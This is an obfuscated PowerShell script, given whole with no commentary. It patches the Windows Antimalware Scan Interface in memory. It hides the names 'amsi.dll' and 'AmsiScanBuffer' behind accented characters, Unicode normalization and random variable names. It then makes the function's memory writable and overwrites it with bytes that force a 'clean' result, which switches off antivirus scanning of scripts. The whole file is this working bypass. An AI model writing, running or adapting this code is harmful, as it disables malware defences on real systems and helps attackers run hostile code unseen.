$dplL = @"
using System;
using System.Runtime.InteropServices;
public class dplL {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr gJztsbRlsMRDgf, string UwSkBF8DuQ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr TDyZWlhD, UIntPtr hOJ1LVmbVYnFHR_x4g, uint mtao7iLAHH3jefaibQt, out uint VLrkOFGvHPkAcl7za);
}
"@

Add-Type $dplL

$eGMSfInOOsGXLAMC = [dplL]::LoadLibrary("$(('àmsì'+'.dll').NOrMALIzE([cHaR]([bytE]0x46)+[CHar](111+24-24)+[cHar]([BYtE]0x72)+[cHAR](52+57)+[cHar]([ByTE]0x44)) -replace [CHAr]([bYTE]0x5c)+[cHaR](42+70)+[CHar]([BYTe]0x7b)+[chAr](77+53-53)+[cHAR]([bYte]0x6e)+[ChAr]([BYTE]0x7d))")
$YZH02Jc_nZRXzT5 = [dplL]::GetProcAddress($eGMSfInOOsGXLAMC, "$(('Âmsí'+'Scán'+'Bûff'+'èr').NORMAlIZE([CHAr](70+52-52)+[cHAR](111+30-30)+[char]([byTE]0x72)+[ChAR]([Byte]0x6d)+[char](68+47-47)) -replace [chAR]([byTE]0x5c)+[CHar](112+8-8)+[ChaR](123+22-22)+[cHAR]([BYTE]0x4d)+[ChAr]([bYte]0x6e)+[chaR]([bytE]0x7d))")
$p = 0
[dplL]::VirtualProtect($YZH02Jc_nZRXzT5, [uint32]5, 0x40, [ref]$p)
$GdfdH8Tc = "0xB8"
$H5CXh5My_RSGgWh = "0x57"
$oQTgjNTU85SARd = "0x00"
$ws8DWU1Lgp = "0x07"
$RinoCHsz_gQFB = "0x80"
$Sc87IPf6vy9kqqZ2e = "0xC3"
$rHNEXoFZXjw7 = [Byte[]] ($GdfdH8Tc,$H5CXh5My_RSGgWh,$oQTgjNTU85SARd,$ws8DWU1Lgp,+$RinoCHsz_gQFB,+$Sc87IPf6vy9kqqZ2e)
[System.Runtime.InteropServices.Marshal]::Copy($rHNEXoFZXjw7, 0, $YZH02Jc_nZRXzT5, 6)